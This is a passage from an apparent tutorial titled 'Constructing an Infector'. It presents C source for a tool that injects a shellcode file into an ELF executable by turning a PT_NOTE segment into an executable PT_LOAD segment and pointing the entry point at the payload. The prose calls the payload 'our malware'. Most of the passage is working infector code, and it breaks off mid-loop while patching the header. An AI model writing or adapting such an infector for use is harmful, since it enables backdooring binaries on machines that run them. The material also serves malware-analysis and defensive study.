</span></span></code></pre></div><h2 id=constructing-an-infector>Constructing an Infector<a hidden class=anchor aria-hidden=true href=#constructing-an-infector>#</a></h2><p>Now that we have an idea about how ELF files are structured and operate, we can further clarify our objectives. What do we want to do? First we want to read and write.</p><p>But before we can do so, we need to set some declarations based on the ELF structures to help us construct our gadgets:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=n>Elf64_Ehdr</span><span class=o>*</span> <span class=nf>read_elf64_header</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>Elf64_Phdr</span><span class=o>*</span> <span class=nf>read_elf64_program_headers</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>phoff</span><span class=p>,</span> <span class=kt>uint16_t</span> <span class=n>phnum</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>write_elf64_program_headers</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>phoff</span><span class=p>,</span> <span class=kt>uint16_t</span> <span class=n>phnum</span><span class=p>,</span> <span class=n>Elf64_Phdr</span> <span class=o>*</span><span class=n>phdrs</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>write_elf64_header</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=n>Elf64_Ehdr</span> <span class=o>*</span><span class=n>header</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span><span class=o>*</span> <span class=nf>read_file</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>filename</span><span class=p>,</span> <span class=kt>size_t</span> <span class=o>*</span><span class=n>length</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>write_u64_le</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=n>dest</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>val</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>patch</span><span class=p>(</span><span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>**</span><span class=n>shellcode</span><span class=p>,</span> <span class=kt>size_t</span> <span class=o>*</span><span class=n>shellcode_len</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>entry_point</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>start_offset</span><span class=p>);</span>
</span></span></code></pre></div><p>We want to open and read both an ELF binary and a shellcode file to some allocated memory buffers. Our <code>main</code> function:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>argc</span> <span class=o>!=</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Usage: %s &lt;ELF File&gt; &lt;Shellcode File&gt;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>argv</span><span class=p>[</span><span class=mi>0</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>elf_path</span> <span class=o>=</span> <span class=n>argv</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>bin_path</span> <span class=o>=</span> <span class=n>argv</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Open ELF file with RW permissions
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>int</span> <span class=n>elf_fd</span> <span class=o>=</span> <span class=nf>open</span><span class=p>(</span><span class=n>elf_path</span><span class=p>,</span> <span class=n>O_RDWR</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>elf_fd</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error opening ELF file &#39;%s&#39;: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>elf_path</span><span class=p>,</span> <span class=nf>strerror</span><span class=p>(</span><span class=n>errno</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Load shellcode from file
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>size_t</span> <span class=n>shellcode_len</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=n>shellcode</span> <span class=o>=</span> <span class=nf>read_file</span><span class=p>(</span><span class=n>bin_path</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>shellcode_len</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>shellcode</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error reading shellcode file &#39;%s&#39;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>bin_path</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>close</span><span class=p>(</span><span class=n>elf_fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Parse ELF and program headers
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>Elf64_Ehdr</span> <span class=o>*</span><span class=n>elf_header</span> <span class=o>=</span> <span class=nf>read_elf64_header</span><span class=p>(</span><span class=n>elf_fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>elf_header</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error reading ELF header</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>close</span><span class=p>(</span><span class=n>elf_fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>shellcode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>Elf64_Phdr</span> <span class=o>*</span><span class=n>program_headers</span> <span class=o>=</span> <span class=nf>read_elf64_program_headers</span><span class=p>(</span><span class=n>elf_fd</span><span class=p>,</span> <span class=n>elf_header</span><span class=o>-&gt;</span><span class=n>e_phoff</span><span class=p>,</span> <span class=n>elf_header</span><span class=o>-&gt;</span><span class=n>e_phnum</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>program_headers</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error reading program headers</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>close</span><span class=p>(</span><span class=n>elf_fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>elf_header</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>shellcode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// snipped
</span></span></span></code></pre></div><p>We first call out to our <code>read_file</code> function to get our shellcode. Once inside, we give <code>fopen</code> our filename and <code>SEEK</code> to the end of the file to get its size with <code>ftell</code>.</p><p>We call <code>malloc</code> against our file size to allocate a buffer, then call <code>fread</code> to read the file into the newly allocated buffer. If the function doesn&rsquo;t error out, we return a pointer to the buffer.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// Read entire contents of a file into a dynamically allocated buffer
</span></span></span><span class=line><span class=cl><span class=c1>// File length is stored in *length
</span></span></span><span class=line><span class=cl><span class=c1>// Return pointer to buffer on success, or NULL on failure
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span><span class=o>*</span> <span class=nf>read_file</span><span class=p>(</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=n>filename</span><span class=p>,</span> <span class=kt>size_t</span> <span class=o>*</span><span class=n>length</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>FILE</span> <span class=o>*</span><span class=n>fp</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=s>&#34;rb&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>fp</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error opening file &#39;%s&#39;: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>filename</span><span class=p>,</span> <span class=nf>strerror</span><span class=p>(</span><span class=n>errno</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>fseek</span><span class=p>(</span><span class=n>fp</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>SEEK_END</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error seeking in file &#39;%s&#39;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fclose</span><span class=p>(</span><span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kt>long</span> <span class=n>file_size</span> <span class=o>=</span> <span class=nf>ftell</span><span class=p>(</span><span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>file_size</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error getting file size for &#39;%s&#39;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fclose</span><span class=p>(</span><span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>rewind</span><span class=p>(</span><span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>char</span> <span class=o>*</span><span class=n>buffer</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=n>file_size</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>buffer</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error allocating memory for file &#39;%s&#39;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fclose</span><span class=p>(</span><span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>read_size</span> <span class=o>=</span> <span class=nf>fread</span><span class=p>(</span><span class=n>buffer</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=n>file_size</span><span class=p>,</span> <span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>read_size</span> <span class=o>!=</span> <span class=p>(</span><span class=kt>size_t</span><span class=p>)</span><span class=n>file_size</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error reading file &#39;%s&#39;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=n>filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>buffer</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fclose</span><span class=p>(</span><span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>fclose</span><span class=p>(</span><span class=n>fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=n>length</span> <span class=o>=</span> <span class=n>read_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>buffer</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>After returning from our call to <code>read_file</code> to get the shellcode buffer, we&rsquo;re ready to call our ELF helper functions to parse both the ELF header and its program headers.</p><p>We use <code>lseek</code> and <code>SEEK_SET</code> to get an offset to the beginning of the ELF header and allocate it to memory with <code>malloc</code>. Then we get the program headers.</p><p>The resulting size of the array of program headers is the size of the <code>ELF64_Phdr</code> times the number of program headers <code>phnum</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl><span class=c1>// Read the ELF64 header from the given file descriptor
</span></span></span><span class=line><span class=cl><span class=c1>// Return a pointer to an allocated Elf64_Ehdr structure on success, or NULL on failure
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=n>Elf64_Ehdr</span><span class=o>*</span> <span class=nf>read_elf64_header</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>lseek</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=n>SEEK_SET</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error seeking to beginning of ELF file</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf64_Ehdr</span> <span class=o>*</span><span class=n>header</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>Elf64_Ehdr</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>header</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error allocating memory for ELF header</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>header</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>Elf64_Ehdr</span><span class=p>))</span> <span class=o>!=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>Elf64_Ehdr</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error reading ELF header</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>header</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>header</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Read ELF64 program headers from the given file descriptor at offset phoff
</span></span></span><span class=line><span class=cl><span class=c1>// expecting phnum headers 
</span></span></span><span class=line><span class=cl><span class=c1>// Return a pointer to an allocated array of program headers
</span></span></span><span class=line><span class=cl><span class=c1>// or NULL on failure
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=n>Elf64_Phdr</span><span class=o>*</span> <span class=nf>read_elf64_program_headers</span><span class=p>(</span><span class=kt>int</span> <span class=n>fd</span><span class=p>,</span> <span class=kt>uint64_t</span> <span class=n>phoff</span><span class=p>,</span> <span class=kt>uint16_t</span> <span class=n>phnum</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>lseek</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>phoff</span><span class=p>,</span> <span class=n>SEEK_SET</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error seeking to program headers offset</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>Elf64_Phdr</span> <span class=o>*</span><span class=n>phdrs</span> <span class=o>=</span> <span class=nf>malloc</span><span class=p>(</span><span class=k>sizeof</span><span class=p>(</span><span class=n>Elf64_Phdr</span><span class=p>)</span> <span class=o>*</span> <span class=n>phnum</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>phdrs</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error allocating memory for program headers</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kt>size_t</span> <span class=n>total_size</span> <span class=o>=</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>Elf64_Phdr</span><span class=p>)</span> <span class=o>*</span> <span class=n>phnum</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>read</span><span class=p>(</span><span class=n>fd</span><span class=p>,</span> <span class=n>phdrs</span><span class=p>,</span> <span class=n>total_size</span><span class=p>)</span> <span class=o>!=</span> <span class=p>(</span><span class=kt>ssize_t</span><span class=p>)</span><span class=n>total_size</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error reading program headers from ELF file</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>phdrs</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nb>NULL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>phdrs</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>After we&rsquo;ve read both our shellcode file and our ELF headers, allocating them to memory with <code>malloc</code> &ndash; we land back in <code>main</code> function once more.</p><p>Now we do a few important things. First we store the original <code>e_entry</code> from the ELF header in <code>original entry</code>. We need this later.</p><p>Then we get the file size of the target ELF binary with <code>stat</code> by accessing <code>st_size</code>. We save this physical file size offset in <code>file_offset</code>.</p><p>Then we generate a <code>memory_offset</code> using a high address by adding <code>0xc00000000</code> to our <code>file_offset</code>. This <code>memory_offset</code> is the virtual addressing where we want to load our shellcode to when our ELF file gets mapped. The high addressing ensures our shellcode will be mapped far away from any of the other data. And it&rsquo;s where we&rsquo;re going to point <code>e_entry</code>.</p><p>Then we alter the <code>PT_NOTE</code> into a <code>PT_LOAD</code> segment. We give it <code>read</code> and <code>execute</code> permissions. We set the <code>p_offset</code> field to our <code>file_offset</code> and our virtual memory address to the <code>memory_offset</code>.</p><p>Then we adjust the <code>p_memsz</code> and <code>p_filesz</code> fields, incrementing them by the length of our shellcode &ndash; making room for it in the virtual file image mapping. And last, we patch the <code>entry</code> of the ELF header to point to our <code>memory_offset</code> where our malware will be mapped to.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-C data-lang=C><span class=line><span class=cl>    <span class=c1>// Save the old entry point so we can jump later
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=kt>uint64_t</span> <span class=n>original_entry</span> <span class=o>=</span> <span class=n>elf_header</span><span class=o>-&gt;</span><span class=n>e_entry</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>sc_len</span> <span class=o>=</span> <span class=p>(</span><span class=kt>uint64_t</span><span class=p>)</span><span class=n>shellcode_len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Calculate offsets for patching the ELF and program headers
</span></span></span><span class=line><span class=cl><span class=c1></span>    
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>stat</span> <span class=n>st</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nf>fstat</span><span class=p>(</span><span class=n>elf_fd</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>st</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fprintf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=s>&#34;Error getting ELF file metadata: %s</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=nf>strerror</span><span class=p>(</span><span class=n>errno</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=nf>close</span><span class=p>(</span><span class=n>elf_fd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>elf_header</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>program_headers</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>free</span><span class=p>(</span><span class=n>shellcode</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>file_offset</span> <span class=o>=</span> <span class=n>st</span><span class=p>.</span><span class=n>st_size</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint64_t</span> <span class=n>memory_offset</span> <span class=o>=</span> <span class=mh>0xc00000000ULL</span> <span class=o>+</span> <span class=n>file_offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Look for PT_NOTE section
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>for</span> <span class=p>(</span><span class=kt>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=n>elf_header</span><span class=o>-&gt;</span><span class=n>e_phnum</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>program_headers</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>p_type</span> <span class=o>==</span> <span class=n>PT_NOTE</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=c1>// Convert to a PT_LOAD section with values to load shellcode
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[+] Found PT_NOTE section</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;[+] Changing to PT_LOAD</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>program_headers</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>p_type</span> <span class=o>=</span> <span class=n>PT_LOAD</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>program_headers</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>p_flags</span> <span class=o>=</span> <span class=n>PF_R</span> <span class=o>|</span> <span class=n>PF_X</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>program_headers</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>p_offset</span> <span class=o>=</span> <span class=n>file_offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>program_headers</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>p_vaddr</span> <span class=o>=</span> <span class=n>memory_offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>program_headers</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>p_memsz</span> <span class=o>+=</span> <span class=n>sc_len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=n>program_headers</span><span class=p>[</span><span class=n>i</span><span class=p>].</span><span class=n>p_filesz</span> <span class=o>+=</span> <span class=n>sc_len</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=c1>// Patch the ELF header to start at the shellcode
</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=n>elf_header</span><span class=o>-&gt;</span><span class=n>e_entry</span> <span class=o>=</span> <span class=n>memory_offset</span><span class=p>;</span>
